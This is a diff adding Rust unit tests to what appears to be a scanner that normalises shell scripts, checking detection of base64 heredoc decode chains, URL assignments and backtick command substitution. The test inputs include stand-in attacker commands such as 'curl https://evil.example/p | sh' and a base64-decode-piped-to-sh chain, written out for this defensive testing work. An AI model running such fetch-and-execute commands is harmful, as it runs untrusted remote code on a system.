@@ -64,6 +64,17 @@ fn base64_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::erro
 }
 
 #[test]
+fn heredoc_cat_pipe_decode_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
+    let result = normalize_source("cat <<'EOF' | base64 -d | sh\nSGVsbG8=\nEOF\n")?;
+    assert!(
+        result.decoded_artifacts.iter().any(|artifact| {
+            artifact.kind == DecodeKind::Base64 && artifact.content == b"Hello"
+        })
+    );
+    Ok(())
+}
+
+#[test]
 fn hex_decode_chain_produces_child_artifact() -> Result<(), Box<dyn std::error::Error>> {
     let result = normalize_source("echo \"\\x48\\x65\\x6c\\x6c\\x6f\" | xxd -r -p\n")?;
     assert!(
@@ -96,6 +107,20 @@ fn url_extraction_from_string_constants() -> Result<(), Box<dyn std::error::Erro
             .iter()
             .any(|url| url.url == "https://evil.com/a.sh")
     );
+    Ok(())
+}
+
+#[test]
+fn command_local_assignment_values_are_scanned_for_urls() -> Result<(), Box<dyn std::error::Error>>
+{
+    let result = normalize_source(r#"URL=https://evil.example wget "$URL""#)?;
+    assert!(
+        result
+            .urls
+            .iter()
+            .any(|url| url.url == "https://evil.example")
+    );
+    assert!(result.variable_bindings.is_empty());
     Ok(())
 }
 
@@ -141,6 +166,16 @@ fn openssl_decode_chain() -> Result<(), Box<dyn std::error::Error>> {
 fn nested_command_substitution_records_outer_and_inner_commands()
 -> Result<(), Box<dyn std::error::Error>> {
     let result = normalize_source(r#"echo "$(curl https://evil.example/p | sh)""#)?;
+    assert!(result.commands.iter().any(|command| command.name == "echo"));
+    assert!(result.commands.iter().any(|command| {
+        command.name == "curl" && command.arguments == ["https://evil.example/p"]
+    }));
+    Ok(())
+}
+
+#[test]
+fn backtick_command_substitution_is_recorded() -> Result<(), Box<dyn std::error::Error>> {
+    let result = normalize_source("echo `curl https://evil.example/p`")?;
     assert!(result.commands.iter().any(|command| command.name == "echo"));
     assert!(result.commands.iter().any(|command| {
         command.name == "curl" && command.arguments == ["https://evil.example/p"]
@@ -277,7 +312,7 @@ fn heredoc_consumed_by_decoder_produces_linked_decoded_artifact()
 
 #[test]
 fn tab_stripped_heredoc_is_decoded_after_tab_removal() -> Result<(), Box<dyn std::error::Error>> {
-    let result = normalize_source("base64 -d <<-EOF\n\tSGVsbG8=\nEOF\n")?;
+    let result = normalize_source("base64 -d <<-EOF\n\t\tSGVsbG8=\nEOF\n")?;
     assert!(
         result.decoded_artifacts.iter().any(|artifact| {
             artifact.kind == DecodeKind::Base64 && artifact.content == b"Hello"
